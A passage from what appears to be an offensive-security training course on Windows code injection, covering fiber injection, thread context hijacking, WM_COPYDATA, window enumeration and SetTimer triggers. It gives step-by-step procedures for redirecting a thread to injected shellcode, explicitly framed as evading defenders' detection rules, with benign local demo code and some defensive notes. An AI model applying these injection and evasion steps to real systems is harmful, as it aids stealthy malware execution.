param->name, i + 1);\r\n        SwitchToFiber(g_fiber1); // Switch to Fiber 1\r\n        printf(\"Fiber %d (%s): Switched back from Fiber 1.\\n\", param->id, param->name);\r\n    }\r\n\r\n    printf(\"Fiber %d (%s): Finished its loop.\\n\", param->id, param->name);\r\n\r\n    // Fiber 2 is done, it will switch back to whoever switched to it last (likely Fiber 1)\r\n    // Fiber 1 will then finish and switch back to the main fiber.\r\n    // If Fiber 2 were switched to directly from main, it would switch back to main.\r\n    // In this specific flow, Fiber 1 calls Fiber 2 last, so Fiber 2 switching will return to Fiber 1.\r\n\r\n    // Note: A Fiber function should typically end with SwitchToFiber\r\n    // or rely on the flow of calls/switches to return to a valid state.\r\n    // If a Fiber function simply returns, the behavior can be undefined\r\n    // unless it's the last fiber to run before the thread exits or converts back.\r\n    // In complex scenarios, you might need a designated \"cleanup\" fiber\r\n    // or careful state management. For this demo, the flow ensures we return to main.\r\n}\r\n\r\nint main() {\r\n    printf(\"Main Thread: Converting to Fiber.\\n\");\r\n    // Convert the main thread to a fiber\r\n    g_mainFiber = ConvertThreadToFiber(NULL);\r\n    if (!g_mainFiber) {\r\n        printf(\"Error converting main thread to fiber: %lu\\n\", GetLastError());\r\n        return 1;\r\n    }\r\n\r\n    FiberParam param1 = {1, \"Alpha\"};\r\n    FiberParam param2 = {2, \"Beta\"};\r\n\r\n    printf(\"Main Thread: Creating Fiber 1.\\n\");\r\n    // Create Fiber 1\r\n    g_fiber1 = CreateFiber(0, FiberFunc1, &param1);\r\n    if (!g_fiber1) {\r\n        printf(\"Error creating Fiber 1: %lu\\n\", GetLastError());\r\n        DeleteFiber(g_mainFiber);\r\n        return 1;\r\n    }\r\n\r\n    printf(\"Main Thread: Creating Fiber 2.\\n\");\r\n    // Create Fiber 2\r\n    g_fiber2 = CreateFiber(0, FiberFunc2, &param2);\r\n    if (!g_fiber2) {\r\n        printf(\"Error creating Fiber 2: %lu\\n\", GetLastError());\r\n        DeleteFiber(g_fiber1);\r\n        DeleteFiber(g_mainFiber);\r\n        return 1;\r\n    }\r\n\r\n    printf(\"Main Thread: Switching to Fiber 1 to start the process.\\n\");\r\n    // Switch to Fiber 1 to begin the execution flow\r\n    SwitchToFiber(g_fiber1);\r\n\r\n    // Execution returns here when the last fiber switches back to g_mainFiber\r\n    printf(\"Main Thread: Switched back from Fibers. Cleaning up.\\n\");\r\n\r\n    // Clean up the created fibers\r\n    DeleteFiber(g_fiber1);\r\n    DeleteFiber(g_fiber2);\r\n    // Note: Do NOT delete g_mainFiber here if the program is about to exit normally.\r\n    // ConvertFiberToThread is deprecated and not needed for normal exit.\r\n\r\n    printf(\"Main Thread: Exiting.\\n\");\r\n    return 0;\r\n}\r\n```\r\n\r\n**Explanation:**\r\n\r\n1.  We convert the main thread into a Fiber using `ConvertThreadToFiber`. This is necessary; a thread must *be* a Fiber to use `SwitchToFiber`.\r\n2.  We create two new Fibers (`g_fiber1`, `g_fiber2`) using `CreateFiber`, specifying their entry point functions (`FiberFunc1`, `FiberFunc2`) and optional parameter data.\r\n3.  We initiate the cooperative multitasking by calling `SwitchToFiber(g_fiber1)`. The execution context (registers, stack pointer, instruction pointer) of the main Fiber is saved, and the context of `g_fiber1` is loaded, causing execution to jump to `FiberFunc1`.\r\n4.  `FiberFunc1` runs, prints messages, and calls `SwitchToFiber(g_fiber2)`. Its context is saved, and execution jumps to `FiberFunc2`.\r\n5.  `FiberFunc2` runs, prints messages, and calls `SwitchToFiber(g_fiber1)`. Its context is saved, and execution jumps back to `FiberFunc1` at the point *after* its `SwitchToFiber(g_fiber2)` call.\r\n6.  This continues until `FiberFunc1` finishes its loop and calls `SwitchToFiber(g_mainFiber)`, returning execution to the `main` function, right after the initial `SwitchToFiber(g_fiber1)` call.\r\n7.  Finally, we clean up the created Fibers using `DeleteFiber`.\r\n\r\n**Remote Fiber Injection Considerations:**\r\n\r\nAs mentioned, remote Fiber injection is complex. You'd need to:\r\n\r\n1.  Allocate memory in the target process.\r\n2.  Write your shellcode/Fiber function into that memory.\r\n3.  Find a thread in the target process to \"host\" your Fiber.\r\n4.  Get a handle to that thread.\r\n5.  *Somehow* get that thread to call `ConvertThreadToFiber` (if it's not already a Fiber) and then `CreateFiber` pointing to your injected code, and finally `SwitchToFiber`. This often involves injecting a *small* stub that performs these Fiber API calls using techniques from previous modules (like APCs or remote threads) and then cleans itself up.\r\n6.  The injected Fiber code would need to manage switching and eventually return control appropriately.\r\n\r\nDue to this complexity, it's not a go-to method for general injection compared to others, but it's a valid, albeit niche, execution context to be aware of. The project stretch goal focuses on the *other* technique in this module, which is more commonly seen in low-level loaders/packers: Context Manipulation.\r\n\r\n---\r\n\r\n### Section 4.2: Manual Thread Context Manipulation (`GetThreadContext`/`SetThreadContext`)\r\n\r\nNow, let's talk about something much more direct and powerful: hijacking a thread's execution mid-flight by manually altering its state.\r\n\r\nEvery thread has an execution **context**. This context is essentially a snapshot of the CPU's state for that specific thread at a given moment. What does it include?\r\n\r\n*   All the CPU registers (general-purpose registers like RAX/EAX, RBX/EBX, RCX/ECX, RDX/EDX, RSP/ESP, RBP/EBP, RDI/EDI, RSI/ESI, R8-R15 on x64, etc.).\r\n*   The **Instruction Pointer** (RIP on x64, EIP on x86). This is the address of the *next instruction* the CPU will execute.\r\n*   The **Stack Pointer** (RSP on x64, ESP on x86). This points to the current top of the thread's stack.\r\n*   The **Base Pointer** (RBP on x64, EBP on x86). Often used as a frame pointer for function calls.\r\n*   Processor flags register.\r\n*   Segment registers.\r\n*   Floating-point and SIMD state (optional, depending on the context flags).\r\n\r\nThis entire state is captured in a structure called `CONTEXT`. The definition of this structure is quite large and architecture-dependent (different fields for x86 and x64).\r\n\r\nWindows provides APIs to read and write this context:\r\n\r\n*   `GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)`: Retrieves the context of the specified thread.\r\n*   `SetThreadContext(HANDLE hThread, const CONTEXT* lpContext)`: Sets the context of the specified thread.\r\n\r\n**The Technique: Hijacking Execution Flow**\r\n\r\nThe core idea for using context manipulation for code execution is simple in concept, complex in implementation:\r\n\r\n1.  Identify a target thread in the remote process.\r\n2.  **Suspend** the target thread. This is critical. You need the thread's state to be stable while you read and modify its context. If you don't suspend it, its registers (especially RIP/EIP) could change between your `GetThreadContext` and `SetThreadContext` calls, leading to unpredictable results or crashes.\r\n3.  Allocate memory in the target process (using techniques from Module 3, like `NtAllocateVirtualMemory` or `VirtualAllocEx`).\r\n4.  Write your shellcode or a small jump stub into the allocated memory (using `NtWriteVirtualMemory` or `WriteProcessMemory`).\r\n5.  Call `GetThreadContext` to read the current state of the suspended thread.\r\n6.  **Save** the original thread context, or at least the critical parts needed to resume execution later (especially the original RIP/EIP and potentially RSP/ESP).\r\n7.  Modify the Instruction Pointer (`Context.Rip` on x64, `Context.Eip` on x86) in the retrieved `CONTEXT` structure to point to the address of your injected shellcode/stub.\r\n8.  Call `SetThreadContext` to apply the modified context to the suspended thread.\r\n9.  **Resume** the target thread (`ResumeThread`).\r\n\r\nWhen the thread resumes, the CPU will load the modified context, including the new Instruction Pointer. Execution will immediately jump to your injected shellcode!\r\n\r\n**The Hard Part: Returning Control**\r\n\r\nSimply jumping to your shellcode isn't enough if you want the target process to continue running normally afterward. Your injected shellcode *must* eventually return control back to the legitimate code flow of the hijacked thread.\r\n\r\nHow?\r\n\r\n1.  **Option A: Execute and Terminate:** The shellcode performs its task (e.g., spawns a process) and then calls `ExitThread` or `ExitProcess`. This works but terminates the hijacked thread or the entire process, which might be noticeable or undesirable.\r\n2.  **Option B: Execute and Restore/Resume:** This is the stealthier but much harder approach. Your shellcode needs to:\r\n    *   Perform its malicious task.\r\n    *   **Restore** the original thread context that you saved *before* modifying the Instruction Pointer. This requires the shellcode to *know* the saved context. The saved context could potentially be written into the allocated memory along with the shellcode itself, or passed as a parameter if the shellcode is structured to accept one (more complex).\r\n    *   Once the context is restored, the shellcode needs to jump back to the original RIP/EIP.\r\n\r\nThis \"execute and restore\" approach is tricky because:\r\n\r\n*   The shellcode needs access to the saved context.\r\n*   Restoring the context perfectly requires careful assembly code to load all the saved registers.\r\n*   The stack (`RSP`/`ESP`) needs careful consideration. Does your shellcode use the target thread's stack? Does it switch to its own temporary stack? When restoring, you need to make sure the stack is in a consistent state for the original code to resume correctly.\r\n\r\nThis is where low-level control and understanding assembly become crucial, similar to the techniques used in sophisticated packers and shellcode loaders to seamlessly transfer execution.\r\n\r\n#### `CONTEXT` Structure (Simplified View)\r\n\r\nThe `CONTEXT` structure is defined in `winnt.h`. Its layout depends heavily on the architecture (`#ifdef _M_IX86` vs. `#ifdef _M_X64`). It contains fields like:\r\n\r\n```c++\r\n// Simplified structure for illustration (actual struct is much larger)\r\ntypedef struct _CONTEXT {\r\n    // ... other fields ...\r\n    DWORD ContextFlags; // Specifies which parts of the context are valid\r\n\r\n    // ... integer registers ...\r\n#ifdef _M_X64\r\n    DWORD64 Rip; // Instruction Pointer (x64)\r\n    DWORD64 Rsp; // Stack Pointer (x64)\r\n    DWORD64 Rbp; // Base Pointer (x64)\r\n    // ... other x64 registers (Rax, Rbx, Rcx, Rdx, R8-R15, etc.)\r\n#else // _M_IX86\r\n    DWORD Eip; // Instruction Pointer (x86)\r\n    DWORD Esp; // Stack Pointer (x86)\r\n    DWORD Ebp; // Base Pointer (x86)\r\n    // ... other x86 registers (Eax, Ebx, Ecx, Edx, Esi, Edi, etc.)\r\n#endif\r\n\r\n    // ... segment registers, floating point state, etc. ...\r\n\r\n} CONTEXT, *PCONTEXT;\r\n\r\n// Important ContextFlags values:\r\n// CONTEXT_i386 or CONTEXT_AMD64: Include integer registers (contains Eip/Rip, Esp/Rsp, Ebp/Rbp)\r\n// CONTEXT_CONTROL: Include control registers (contains Eip/Rip, Esp/Rsp, Ebp/Rbp, EFlags/EFlags)\r\n// CONTEXT_FULL: Includes CONTEXT_CONTROL, CONTEXT_INTEGER, and CONTEXT_SEGMENTS\r\n// CONTEXT_ALL: Includes CONTEXT_FULL and floating-point/SIMD state\r\n\r\n// When using GetThreadContext/SetThreadContext for execution hijacking,\r\n// you typically need at least CONTEXT_CONTROL or CONTEXT_FULL to get/set the instruction pointer.\r\n```\r\n\r\n#### Simple Local Context Manipulation Example (Illustrative)\r\n\r\nCreating a *complete* remote context manipulation example that handles saving/restoring context and injecting complex shellcode is beyond a simple module example. It involves writing architecture-specific shellcode.\r\n\r\nHowever, we can demonstrate the *mechanics* of `GetThreadContext` and `SetThreadContext` locally. This example shows how to get the context of the main thread, modify its instruction pointer to jump to a *different function* within the *same* process, and then resume.\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <stdio.h>\r\n\r\n// Function we will redirect execution to\r\nVOID RedirectedFunction() {\r\n    printf(\"--> Execution successfully redirected here!\\n\");\r\n    // In a real hijack, shellcode would execute here.\r\n    // For this simple demo, we'll just exit the thread to avoid crashing.\r\n    // A real advanced technique would restore context and jump back.\r\n    ExitThread(0);\r\n}\r\n\r\nint main() {\r\n    HANDLE hCurrentThread = GetCurrentThread();\r\n    DWORD dwThreadId = GetCurrentThreadId();\r\n\r\n    printf(\"Main Thread (ID: %lu):"
    },
    {
      "title": "module_5",
      "description": "module_5 Overview",
      "order": 5,
      "content": "Alright team, let's shift gears and get really creative. We've looked at the \"standard\" heavy hitters like APCs, Native API calls, and even the more structured approach of Fibers. Now, we're going to explore the edges ‚Äì the often-overlooked or less direct methods that leverage standard Windows features in unconventional ways. This is where understanding the *system's design* really pays off, allowing us to find execution vectors that might fly under the radar because they don't look like typical \"injection.\"\r\n\r\nRemember, the goal isn't just a list of techniques, but understanding the underlying Windows mechanisms we're bending to our will. This module is about expanding our toolbox and thinking like a true system artist, finding canvases where others don't look.\r\n\r\n---\r\n\r\n## Module 5: Thinking Outside the Box - Unconventional Execution Vectors\r\n\r\n**Module Objective:** Explore less common and more creative methods for achieving code execution within a target process by leveraging standard Windows features in unconventional ways.\r\n\r\n**Estimated Time:** 4-6 hours (including project work)\r\n\r\n**Why This Matters:** Defenders often focus on common injection techniques (`CreateRemoteThread`, APCs, etc.). By using less conventional methods, we can potentially bypass standard monitoring and detection rules. Furthermore, understanding these methods reveals the sheer flexibility of the Windows API and how seemingly innocuous features can be repurposed. This aligns perfectly with the `zhasslan.txt` philosophy of deeply understanding the system to exploit its nuances.\r\n\r\n---\r\n\r\n### 5.1 Execution via Window Messages (`WM_COPYDATA`)\r\n\r\n**Concept:** The Windows messaging system is primarily for communication between GUI elements and threads within the *same* process, or between processes in a structured way. However, specific messages like `WM_COPYDATA` are designed for inter-process data transfer. While not a direct \"run code\" button, the mechanism involves the OS temporarily mapping memory between processes, which is a powerful primitive we can potentially leverage or use as a stepping stone.\r\n\r\n**How it Works:**\r\n\r\n1.  **The Windows Message Queue:** Each thread that creates a window typically has a message queue. The thread retrieves messages from this queue (`GetMessage`, `PeekMessage`) and dispatches them to the window's procedure (`WndProc`).\r\n2.  **Sending Messages:**\r\n    *   `SendMessage`: Sends a message and waits for the recipient's `WndProc` to process it and return a value. Synchronous.\r\n    *   `PostMessage`: Places a message in the recipient's queue and returns immediately. Asynchronous.\r\n3.  **`WM_COPYDATA`:** This is a special message specifically for passing data between processes. When `SendMessage(hWnd, WM_COPYDATA, ..., ...)` is called:\r\n    *   The `lParam` parameter is expected to be a pointer to a `COPYDATASTRUCT`.\r\n    *   The `COPYDATASTRUCT` contains fields describing the data: `dwData` (user-defined value), `cbData` (size of data), and `lpData` (pointer to the data *in the sending process's address space*).\r\n    *   **Crucial Mechanism:** The operating system temporarily maps the sender's memory containing the data (`lpData`) into the *recipient's* address space while the `WM_COPYDATA` message is being processed by the recipient's `WndProc`. This allows the recipient to directly access the sender's data buffer without needing `ReadProcessMemory`.\r\n    *   The recipient's `WndProc` receives the message, checks if it's `WM_COPYDATA`, casts `lParam` to `COPYDATASTRUCT*`, and accesses the data via the provided pointer.\r\n\r\n**Why is this \"Unconventional\" for Execution?**\r\n\r\n*   `WM_COPYDATA` is *intended* for data transfer, not code execution.\r\n*   Achieving arbitrary code execution *directly* via `WM_COPYDATA` usually requires a vulnerability in the *target application's* `WndProc` that mishandles the received data (e.g., copies it to a fixed-size buffer without checking size, interprets `dwData` or `lpData` as a function pointer and calls it, etc.). This is more an application exploit than a pure OS-level injection technique like APCs.\r\n*   **However:**\r\n    *   The *mechanism* of mapping memory is interesting and could potentially be part of a more complex chain.\r\n    *   It can be used as a stealthy **communication channel** for injected code or between malicious components in different processes, bypassing network/file monitoring.\r\n    *   It can be used to pass pointers to injected shellcode or data *if* you've already managed to inject memory into the target process via another method (like `WriteProcessMemory` which requires `VirtualAllocEx`), and the target `WndProc` is somehow tricked or designed to handle this. (Less likely for arbitrary targets, more for specific application exploits).\r\n    *   It can be used to trigger *existing* code paths in the target process by sending specific data values that the `WndProc` interprets as commands.\r\n\r\n**Limitations:**\r\n\r\n*   Requires the target process to have a window with a message loop that is actively processing messages.\r\n*   Requires knowing the handle (`HWND`) of a target window.\r\n*   Direct arbitrary code execution is unlikely without an application-specific vulnerability.\r\n\r\n**Implementation Steps (Sender Side - Sending Data):**\r\n\r\n1.  Find the target window handle (`HWND`). `FindWindow` or enumeration functions (discussed next) are useful here.\r\n2.  Prepare the data you want to send in a buffer in *your* process's memory.\r\n3.  Populate a `COPYDATASTRUCT` with information about your data (size, pointer, optional `dwData`).\r\n4.  Call `SendMessage` with the target window handle, `WM_COPYDATA`, a `wParam` (often the sender's window handle, but can be 0), and the address of your `COPYDATASTRUCT` as `lParam`.\r\n\r\n**Code Example (Sending WM_COPYDATA):**\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <iostream>\r\n#include <string>\r\n\r\n// Function to find a window by title substring (basic example)\r\nHWND FindTargetWindow(const std::wstring& titleSubstring) {\r\n    HWND hWnd = NULL;\r\n    // EnumWindows calls the callback function for each top-level window\r\n    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {\r\n        wchar_t windowTitle[256];\r\n        // Check if window is visible and has a title\r\n        if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {\r\n            GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(windowTitle[0]));\r\n            std::wstring title = windowTitle;\r\n            // Check if the title contains the substring\r\n            if (title.find(*(std::wstring*)lParam) != std::wstring::npos) {\r\n                *(HWND*)lParam = hwnd; // Store the found handle\r\n                return FALSE; // Stop enumeration\r\n            }\r\n        }\r\n        return TRUE; // Continue enumeration\r\n    }, (LPARAM)&titleSubstring); // Pass the substring via lParam\r\n\r\n    return *(HWND*)&titleSubstring; // Return the found handle\r\n}\r\n\r\nint main() {\r\n    // 1. Find the target window (e.g., Notepad)\r\n    std::wstring targetTitle = L\"Untitled - Notepad\"; // Adjust as needed\r\n    HWND hWndTarget = FindTargetWindow(targetTitle);\r\n\r\n    if (!hWndTarget) {\r\n        std::cerr << \"[-] Target window not found.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::cout << \"[+] Found target window handle: \" << hWndTarget << std::endl;\r\n\r\n    // 2. Prepare the data to send\r\n    std::string dataToSend = \"Hello from Injector!\";\r\n    // We need to send the data as a null-terminated string for simplicity\r\n    // Add 1 for the null terminator\r\n    size_t dataSize = dataToSend.length() + 1;\r\n\r\n    // 3. Populate the COPYDATASTRUCT\r\n    COPYDATASTRUCT cds;\r\n    cds.dwData = 0x12345678; // User-defined data (can be anything)\r\n    cds.cbData = dataSize;   // Size of the data buffer\r\n    cds.lpData = dataToSend.data(); // Pointer to the data in *our* process\r\n\r\n    std::cout << \"[+] Sending WM_COPYDATA message...\" << std::endl;\r\n\r\n    // 4. Send the WM_COPYDATA message\r\n    // SendMessage returns LRESULT, which is often interpreted by the recipient\r\n    // For WM_COPYDATA, a non-zero return typically indicates success\r\n    LRESULT result = SendMessage(hWndTarget,\r\n                                 WM_COPYDATA,\r\n                                 (WPARAM)GetConsoleWindow(), // Optional: sender window handle\r\n                                 (LPARAM)&cds); // Pointer to the COPYDATASTRUCT\r\n\r\n    if (result == 0) {\r\n        // Recipient returned 0, might indicate failure or specific handling\r\n        std::cerr << \"[-] SendMessage returned 0. Target might not handle WM_COPYDATA or indicated failure.\" << std::endl;\r\n    } else {\r\n        std::cout << \"[+] SendMessage successful. Result: \" << result << std::endl;\r\n    }\r\n\r\n    std::cout << \"[+] Data sent: \\\"\" << dataToSend << \"\\\"\" << std::endl;\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n**Implementation Steps (Recipient Side - Handling Data):**\r\n\r\nThe target process needs a `WndProc` that handles the `WM_COPYDATA` message.\r\n\r\n1.  Check if the received message (`uMsg`) is `WM_COPYDATA`.\r\n2.  If it is, cast the `lParam` to `PCOPYDATASTRUCT`.\r\n3.  Access the data using `pcds->lpData` and `pcds->cbData`. Remember `pcds->lpData` points to memory in the *sender's* process, but the OS makes it accessible temporarily.\r\n4.  Process the data.\r\n5.  Return a non-zero value to indicate successful processing (or 0 for failure, depending on convention).\r\n\r\n**Code Example (Recipient WndProc Snippet):**\r\n\r\n```cpp\r\n// This code would be inside the target process's WndProc function\r\nLRESULT CALLBACK TargetWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\r\n    switch (uMsg) {\r\n        case WM_COPYDATA:\r\n        {\r\n            PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;\r\n            std::cout << \"[+] Received WM_COPYDATA message!\" << std::endl;\r\n            std::cout << \"    dwData: \" << std::hex << pcds->dwData << std::dec << std::endl;\r\n            std::cout << \"    cbData: \" << pcds->cbData << \" bytes\" << std::endl;\r\n\r\n            // Access the data. pcds->lpData points to sender's memory,\r\n            // temporarily mapped into our address space.\r\n            if (pcds->lpData != NULL && pcds->cbData > 0) {\r\n                // Treat as a string (assuming null termination)\r\n                std::string receivedData(static_cast<const char*>(pcds->lpData), pcds->cbData);\r\n                std::cout << \"    lpData: \\\"\" << receivedData << \"\\\"\" << std::endl;\r\n\r\n                // *** POTENTIAL UNCONVENTIONAL USE CASE ***\r\n                // If dwData was a command ID and lpData was parameters,\r\n                // or if the application's logic interpreted lpData in a specific way\r\n                // (e.g., as a path to load, a command string to execute via system()),\r\n                // this could trigger actions within the target process.\r\n                // Direct execution of lpData as code is NOT typical or safe here.\r\n\r\n            } else {\r\n                 std::cout << \"    lpData is NULL or cbData is 0.\" << std::endl;\r\n            }\r\n\r\n            // Return non-zero to indicate successful handling\r\n            return TRUE; // Or any non-zero value\r\n        }\r\n        // ... other message handlers ...\r\n        case WM_DESTROY:\r\n            PostQuitMessage(0);\r\n            break;\r\n        default:\r\n            return DefWindowProc(hWnd, uMsg, wParam, lParam);\r\n    }\r\n    return 0;\r\n}\r\n```\r\n\r\n**Defensive Considerations:**\r\n\r\n*   Monitor `SendMessage` and `PostMessage` calls, especially `WM_COPYDATA`, originating from unusual processes or targeting critical system processes.\r\n*   Analyze the content of `COPYDATASTRUCT` being passed.\r\n*   Hook `WndProc` in critical processes to log or block suspicious messages.\r\n\r\n---\r\n\r\n### 5.2 Leveraging Desktop and Window Enumeration\r\n\r\n**Concept:** Windows provides functions like `EnumWindows`, `EnumChildWindows`, `EnumDesktops`, `EnumDesktopWindows` to enumerate windows or desktops. These functions take a callback function pointer that the OS invokes for each enumerated item.\r\n\r\n**How it Works:**\r\n\r\n*   `EnumWindows(EnumWindowsProc, lParam)`: Enumerates all top-level windows on the screen. Calls `EnumWindowsProc` for each.\r\n*   `EnumChildWindows(hWndParent, EnumChildProc, lParam)`: Enumerates child windows of a given parent window. Calls `EnumChildProc` for each.\r\n*   `EnumDesktops(HWINSTA, EnumDesktopsProc, lParam)`: Enumerates desktops for a given window station. Calls `EnumDesktopsProc` for each.\r\n*   `EnumDesktopWindows(HDESK, EnumDesktopWindowsProc, lParam)`: Enumerates top-level windows on a specific desktop. Calls `EnumDesktopWindowsProc` for each.\r\n\r\n**Why is this relevant to \"Execution Vectors\"?**\r\n\r\n*   **Primary Use (Offensive): Reconnaissance.** These functions are invaluable for finding target window handles (`HWND`) and associated process IDs (`PID`). Once you have a target `HWND` and `PID`, you can use techniques from *other* modules (like finding threads, allocating memory, sending `WM_COPYDATA`, etc.).\r\n*   **Potential Indirect Use (Less Common):** If a target application *itself* calls one of these enumeration functions and the *callback function within the target process* has a vulnerability (e.g., buffer overflow when processing window titles, use-after-free, etc.), then you *might* be able to trigger that vulnerability. However, this is an application-specific exploit, not a general injection method via the enumeration process itself.\r\n*   **Important Clarification:** The callback functions (`EnumWindowsProc`, etc.) are executed by the *calling thread* in the *calling process*. They do *not* automatically run code in the target process you are enumerating. You are enumerating *information* about other processes' windows, not injecting code *into* them via the callback mechanism itself.\r\n\r\n**Implementation Steps (Enumeration):**\r\n\r\n1.  Define a callback function with the correct signature (`BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)` for `EnumWindows`).\r\n2.  Inside the callback, retrieve information about the window (`hwnd`) like its title (`GetWindowText`), class name (`GetClassName`), thread ID (`GetWindowThreadProcessId`).\r\n3.  Optionally, use `lParam` to pass state or data into the callback (like a list to store results or a target criteria).\r\n4.  Call the enumeration function (`EnumWindows`, etc.) with your callback and `lParam`.\r\n5.  The callback should return `TRUE` to continue enumeration or `FALSE` to stop.\r\n\r\n**Code Example (Enumerating Top-Level Windows):**\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <iostream>\r\n#include <vector>\r\n\r\nstruct WindowInfo {\r\n    HWND hwnd;\r\n    DWORD pid;\r\n    DWORD tid;\r\n    std::wstring title;\r\n};\r\n\r\n// Callback function for EnumWindows\r\nBOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {\r\n    // Retrieve the vector of WindowInfo objects passed via lParam\r\n    std::vector<WindowInfo>* windowList = reinterpret_cast<std::vector<WindowInfo>*>(lParam);\r\n\r\n    // Get Process and Thread ID\r\n    DWORD pid = 0;\r\n    DWORD tid = GetWindowThreadProcessId(hwnd, &pid);\r\n\r\n    // Get Window Title\r\n    wchar_t windowTitle[256];\r\n    int titleLength = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(windowTitle[0]));\r\n    std::wstring title = (titleLength > 0) ? windowTitle : L\"\";\r\n\r\n    // Filter criteria (optional, e.g., only visible windows with titles)\r\n    if (IsWindowVisible(hwnd) && titleLength > 0) {\r\n        windowList->push_back({hwnd, pid, tid, title});\r\n    }\r\n\r\n    return TRUE; // Continue enumeration\r\n}\r\n\r\nint main() {\r\n    std::cout << \"[+] Enumerating top-level windows...\" << std::endl;\r\n\r\n    std::vector<WindowInfo> windows;\r\n\r\n    // Call EnumWindows with our callback and pass the vector address\r\n    if (EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&windows))) {\r\n        std::cout << \"[+] Enumeration complete.\" << std::endl;\r\n        std::cout << \"Found \" << windows.size() << \" visible windows with titles:\" << std::endl;\r\n\r\n        for (const auto& win : windows) {\r\n            std::wcout << L\"  HWND: \" << win.hwnd\r\n                       << L\", PID: \" << win.pid\r\n                       << L\", TID: \" << win.tid\r\n                       << L\", Title: \\\"\" << win.title << L\"\\\"\" << std::endl;\r\n        }\r\n    } else {\r\n        std::cerr << \"[-] EnumWindows failed. Error: \" << GetLastError() << std::endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n**Defensive Considerations:**\r\n\r\n*   Monitor calls to enumeration functions from suspicious processes.\r\n*   Analyze the behavior of processes that perform extensive enumeration ‚Äì this is often a reconnaissance step for attackers.\r\n*   Ensure your own application's enumeration callbacks are robust and don't have vulnerabilities if they process data from external sources (less common for standard window properties, but relevant if enumerating custom objects).\r\n\r\n---\r\n\r\n### 5.3 Abusing Callbacks and Timers (`SetTimer`)\r\n\r\n**Concept:** Several Windows APIs allow you to register a callback function to be executed later. Examples include APCs (which we covered), timer callbacks (`TIMERPROC`), and callbacks for asynchronous I/O, thread pools, etc. While APCs are a direct execution method, others like `SetTimer` can *trigger* execution of code you've already placed in the target process.\r\n\r\n**How `SetTimer` Works:**\r\n\r\n1.  `SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc)`: Creates a timer.\r\n    *   `hWnd`: Handle of the window associated with the timer. Can be `NULL` if the timer is associated with a thread instead (requires a message loop).\r\n    *   `nIDEvent`: A timer ID.\r\n    *   `uElapse`: The timeout value in milliseconds.\r\n    *   `lpTimerFunc`: An optional pointer to a `TIMERPROC` callback function. If `NULL`, the system posts a `WM_TIMER` message to the window/thread's message queue. If non-`NULL`, the `TIMERPROC` is called directly by the system when the timer expires.\r\n2.  **Requirement:** The thread that calls `SetTimer` (or the thread owning the window specified by `hWnd`) *must* have a message loop that dispatches messages. Timer messages/callbacks are processed within this message loop.\r\n3.  **`TIMERPROC`:** The callback function signature is `VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)`. This function is called by the system *in the context of the thread that set the timer* when the timer expires.\r\n\r\n**Why is this an \"Unconventional\" Execution Vector?**\r\n\r\n*   It's not a method to *get* code into the target process initially (unlike `WriteProcessMemory` or mapping sections).\r\n*   It's an *execution trigger* for code that is *already* in the target process's memory.\r\n*   To use `SetTimer` remotely for arbitrary code execution, you would typically need to:\r\n    1.  Use a method from previous modules (`VirtualAllocEx`, `WriteProcessMemory`, etc.) to allocate executable memory in the target process and write your shellcode or `TIMERPROC` implementation into it.\r\n    2.  Obtain a handle to a thread in the target process that *has a message loop*. (Enumeration techniques or checking thread state might help identify suitable threads, though reliably checking for a message loop remotely is tricky without already having code in the process).\r\n    3.  Use a method like `QueueUserAPC` or `CreateRemoteThreadEx` to execute code in the target thread that *calls* `SetTimer` with a pointer to your injected `TIMERPROC` code.\r\n\r\n**Implementation Steps (Remote Timer Execution - Conceptual):**\r\n\r\n1.  (Prerequisite from Module 3): Get a handle to the target process (`OpenProcess`).\r\n2.  (Prerequisite from Module 3): Allocate executable memory in the target process (`NtAllocateVirtualMemory` or `VirtualAllocEx`).\r\n3.  (Prerequisite from Module 3): Write your `TIMERPROC` shellcode/function into the allocated memory (`NtWriteVirtualMemory` or `WriteProcessMemory`).\r\n4.  (Prerequisite from Module 1): Find a suitable target thread (one with a message loop). Get a handle to it (`OpenThread`).\r\n5.  (Prerequisite from Module 2): Prepare a small APC payload or use `NtCreateThreadEx` to run code in the target thread. This code will call `SetTimer`.\r\n6.  The code running in the target thread executes `SetTimer(NULL, timerId, delay, pointerToInjectedTimerProc)`.\r\n7.  After `delay` milliseconds, if the target thread is processing messages, your injected `TIMERPROC` is called.\r\n\r\n**Code Example (Local SetTimer):**\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <iostream>\r\n\r\n// Global flag to indicate if the timer fired\r\nbool timerFired = false;\r\n\r\n// The TIMERPROC callback function\r\nVOID CALLBACK MyTimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {\r\n    // This function executes in the context of the thread that set the timer\r\n    std::cout << \"[+] Timer fired in thread ID: \" << GetCurrentThreadId() << std::endl;\r\n    std::cout << \"    idEvent: \" << idEvent << std::endl;\r\n    // In a real scenario, your shellcode/payload would go here\r\n    MessageBoxW(NULL, L\"Timer Payload Executed!\", L\"Timer Fire!\", MB_OK);\r\n    timerFired = true; // Signal that the timer fired\r\n}\r\n\r\nint main() {\r\n    std::cout << \"[+] Setting up a timer...\" << std::endl;\r\n\r\n    // Get the handle of the current console window (it has a message loop)\r\n    HWND hWndConsole = GetConsoleWindow();\r\n    if (hWndConsole == NULL) {\r\n        std::cerr << \"[-] Failed to get console window handle.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    UINT_PTR timerId = 1; // A unique ID for this timer\r\n    UINT delay = 2000;   // 2000 milliseconds = 2 